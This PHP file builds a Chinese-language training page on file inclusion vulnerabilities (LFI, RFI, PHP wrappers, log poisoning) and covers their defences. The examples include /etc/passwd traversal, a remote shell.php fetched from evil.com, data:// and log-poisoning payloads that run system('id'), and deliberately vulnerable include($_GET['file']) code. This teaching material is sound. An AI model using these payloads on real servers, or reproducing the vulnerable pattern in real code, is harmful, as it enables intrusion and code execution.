<?php
$module_name = '文件包含漏洞基础';
$module_icon = '📚';
$module_desc = '学习文件包含漏洞的基本概念、类型、原理和防御方法。';

$content = <<<'EOT'
<div class="card">
    <div class="card-header">
        <h5 class="mb-0">📚 文件包含漏洞基础</h5>
    </div>
    <div class="card-body">
        <div class="alert alert-info">
            <strong>💡 学习目标：</strong><br>
            理解文件包含漏洞的基本概念、攻击原理、常见类型和防御方法。
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>📂 什么是文件包含漏洞？</h6>
            </div>
            <div class="card-body">
                <p><strong>文件包含漏洞</strong>是指应用程序在包含文件时，没有对用户输入进行充分验证，导致攻击者可以包含任意文件，从而执行恶意代码或读取敏感信息。</p>
                
                <div class="row mt-3">
                    <div class="col-md-6">
                        <div class="card bg-light h-100">
                            <div class="card-body">
                                <h6 class="card-title">🔍 核心原理</h6>
                                <p class="card-text">PHP等语言提供了文件包含函数（如include、require），当这些函数的参数可控时，就可能导致文件包含漏洞。</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="card bg-light h-100">
                            <div class="card-body">
                                <h6 class="card-title">🎯 攻击特点</h6>
                                <ul class="mb-0">
                                    <li>可以包含本地文件</li>
                                    <li>可以包含远程文件（RFI）</li>
                                    <li>可以执行恶意代码</li>
                                    <li>可以读取敏感文件</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>📊 文件包含攻击流程图</h6>
            </div>
            <div class="card-body">
                <div class="mermaid-container" style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
                    <pre class="mermaid">
flowchart TD
    A[攻击者] -->|构造恶意路径| B[Web应用]
    B -->|包含文件| C[目标文件]
    C -->|执行/读取| B
    B -->|返回结果| A
    
    style A fill:#ff6b6b,stroke:#333,stroke-width:2px,color:#fff
    style C fill:#ff6b6b,stroke:#333,stroke-width:2px,color:#fff
                    </pre>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🏷️ 文件包含漏洞类型</h6>
            </div>
            <div class="card-body">
                <div class="accordion" id="lfiTypes">
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading1">
                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse1">
                                🔴 本地文件包含 (LFI)
                            </button>
                        </h2>
                        <div id="collapse1" class="accordion-collapse collapse show" data-bs-parent="#lfiTypes">
                            <div class="accordion-body">
                                <p>攻击者能够包含服务器本地的文件，通常用于读取敏感文件或执行恶意代码。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>攻击示例</h6>
                                                <pre class="mb-0"><code>// 前端URL
http://example.com/index.php?file=../../../etc/passwd

// 后端代码
$file = $_GET['file'];
include($file . '.php');</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>常见触发点</h6>
                                                <ul class="mb-0">
                                                    <li>include()/require()函数</li>
                                                    <li>include_once()/require_once()函数</li>
                                                    <li>file_get_contents()函数</li>
                                                    <li>readfile()函数</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="mermaid-container" style="background: #fff; padding: 15px; border-radius: 10px; margin: 15px 0; border: 1px solid #ddd;">
                                    <pre class="mermaid">
sequenceDiagram
        participant A as 攻击者
        participant S as 服务器
        
        A->>S: 请求: ../etc/passwd
        S->>S: include('../etc/passwd')
        S->>A: 返回文件内容
                                    </pre>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading2">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse2">
                                🟠 远程文件包含 (RFI)
                            </button>
                        </h2>
                        <div id="collapse2" class="accordion-collapse collapse" data-bs-parent="#lfiTypes">
                            <div class="accordion-body">
                                <p>攻击者能够包含远程服务器上的文件，通常用于执行恶意代码。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>攻击示例</h6>
                                                <pre class="mb-0"><code>// 前端URL
http://example.com/index.php?file=http://evil.com/shell.php

// 后端代码
$file = $_GET['file'];
include($file);</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>攻击条件</h6>
                                                <ul class="mb-0">
                                                    <li>allow_url_include = On</li>
                                                    <li>allow_url_fopen = On</li>
                                                    <li>文件包含函数参数可控</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="mermaid-container" style="background: #fff; padding: 15px; border-radius: 10px; margin: 15px 0; border: 1px solid #ddd;">
                                    <pre class="mermaid">
sequenceDiagram
        participant A as 攻击者
        participant S as 服务器
        participant E as 恶意服务器
        
        A->>S: 请求: http://evil.com/shell.php
        S->>E: 下载恶意文件
        E->>S: 返回恶意代码
        S->>S: 执行恶意代码
        S->>A: 返回执行结果
                                    </pre>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading3">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse3">
                                🟡 伪协议利用
                            </button>
                        </h2>
                        <div id="collapse3" class="accordion-collapse collapse" data-bs-parent="#lfiTypes">
                            <div class="accordion-body">
                                <p>利用PHP伪协议来执行代码或读取文件。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>攻击示例</h6>
                                                <pre class="mb-0"><code>// 执行PHP代码
http://example.com/index.php?file=php://filter/convert.base64-encode/resource=index.php

// 执行命令
http://example.com/index.php?file=data://text/plain,<?php system('id'); ?></code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>常用伪协议</h6>
                                                <ul class="mb-0">
                                                    <li>php://filter - 读取文件内容</li>
                                                    <li>data:// - 执行PHP代码</li>
                                                    <li>php://input - 读取POST数据</li>
                                                    <li>zip:// - 读取压缩文件</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading4">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse4">
                                🟢 日志包含
                            </button>
                        </h2>
                        <div id="collapse4" class="accordion-collapse collapse" data-bs-parent="#lfiTypes">
                            <div class="accordion-body">
                                <p>包含服务器日志文件，利用日志中的用户输入来执行代码。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>攻击示例</h6>
                                                <pre class="mb-0"><code>// 1. 向日志写入PHP代码
GET /<?php system('id'); ?> HTTP/1.1

// 2. 包含日志文件
http://example.com/index.php?file=../../apache/logs/access.log</code></pre>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>常见日志文件</h6>
                                                <ul class="mb-0">
                                                    <li>Apache: /var/log/apache2/access.log</li>
                                                    <li>Nginx: /var/log/nginx/access.log</li>
                                                    <li>IIS: C:\inetpub\logs\LogFiles\</li>
                                                    <li>PHP: /var/log/php-fpm.log</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>⚠️ 文件包含漏洞的危害</h6>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-4 mb-2">
                        <div class="card h-100 border-danger">
                            <div class="card-header bg-danger text-white">
                                <h6 class="mb-0">🔴 代码执行</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li>执行系统命令</li>
                                    <li>上传webshell</li>
                                    <li>完全控制服务器</li>
                                    <li>权限提升</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 mb-2">
                        <div class="card h-100 border-warning">
                            <div class="card-header bg-warning text-dark">
                                <h6 class="mb-0">🟠 数据泄露</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li>读取敏感文件</li>
                                    <li>获取数据库凭证</li>
                                    <li>查看配置文件</li>
                                    <li>访问源代码</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 mb-2">
                        <div class="card h-100 border-info">
                            <div class="card-header bg-info text-white">
                                <h6 class="mb-0">🔵 横向移动</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li>访问内网资源</li>
                                    <li>攻击其他服务器</li>
                                    <li>绕过网络隔离</li>
                                    <li>渗透整个网络</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🔧 文件包含漏洞防御方法</h6>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-6">
                        <div class="card h-100 border-success">
                            <div class="card-header bg-success text-white">
                                <h6 class="mb-0">✅ 核心防御措施</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li><strong>白名单验证：</strong>只允许包含特定文件</li>
                                    <li><strong>路径限制：</strong>限制文件路径，防止目录遍历</li>
                                    <li><strong>禁用危险函数：</strong>禁用include等危险函数</li>
                                    <li><strong>配置安全：</strong>设置allow_url_include = Off</li>
                                    <li><strong>输入验证：</strong>对文件路径进行严格验证</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="card h-100 border-info">
                            <div class="card-header bg-info text-white">
                                <h6 class="mb-0">🔵 辅助防御措施</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li><strong>文件权限：</strong>设置文件和目录的最小权限</li>
                                    <li><strong>日志保护：</strong>限制日志文件的访问权限</li>
                                    <li><strong>WAF：</strong>使用Web应用防火墙</li>
                                    <li><strong>定期审计：</strong>检查代码中的文件包含漏洞</li>
                                    <li><strong>更新依赖：</strong>使用最新版本的PHP</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="mermaid-container" style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
                    <pre class="mermaid">
flowchart TD
    A[用户输入文件路径] --> B{白名单验证}
    B -->|不在白名单| C[拒绝请求]
    B -->|在白名单| D{路径检查}
    D -->|包含../| C
    D -->|安全路径| E{文件存在}
    E -->|不存在| C
    E -->|存在| F[包含文件]
    F --> G[返回结果]
    
    style B fill:#ffd43b,stroke:#333,stroke-width:2px
    style D fill:#ffd43b,stroke:#333,stroke-width:2px
    style E fill:#ffd43b,stroke:#333,stroke-width:2px
    style F fill:#51cf66,stroke:#333,stroke-width:2px,color:#fff
    style C fill:#ff6b6b,stroke:#333,stroke-width:2px,color:#fff
                    </pre>
                </div>

                <div class="card bg-light mt-3">
                    <div class="card-body">
                        <h6>💡 防御代码示例</h6>
                        <pre class="mb-0"><code>// 白名单验证
$allowed_files = ['home', 'about', 'contact'];
$file = $_GET['file'] ?? '';

if (!in_array($file, $allowed_files)) {
    die('访问被拒绝');
}

// 安全包含
include __DIR__ . '/pages/' . $file . '.php';

// 路径清理
function safe_path($path) {
    $path = realpath($path);
    $base_dir = realpath(__DIR__ . '/pages');
    
    if (strpos($path, $base_dir) === 0) {
        return $path;
    }
    return false;
}

$file = safe_path($_GET['file']);
if ($file) {
    include $file;
} else {
    die('访问被拒绝');
}</code></pre>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="../assets/js/mermaid.min.js"></script>
<script>
// 确保mermaid加载完成后再初始化
if (typeof mermaid !== 'undefined') {
    mermaid.initialize({
        startOnLoad: true,
        theme: 'default',
        flowchart: {
            useMaxWidth: true,
            htmlLabels: true,
            curve: 'basis'
        },
        sequence: {
            useMaxWidth: true,
            wrap: true
        }
    });
}

// 监听折叠面板展开事件
document.addEventListener('DOMContentLoaded', function() {
    const accordionItems = document.querySelectorAll('.accordion-collapse');
    accordionItems.forEach(collapse => {
        collapse.addEventListener('shown.bs.collapse', function() {
            // 重新渲染mermaid
            if (typeof mermaid !== 'undefined') {
                mermaid.run();
            }
        });
    });
});
</script>
EOT;

include '../template/module_template.php';
?>
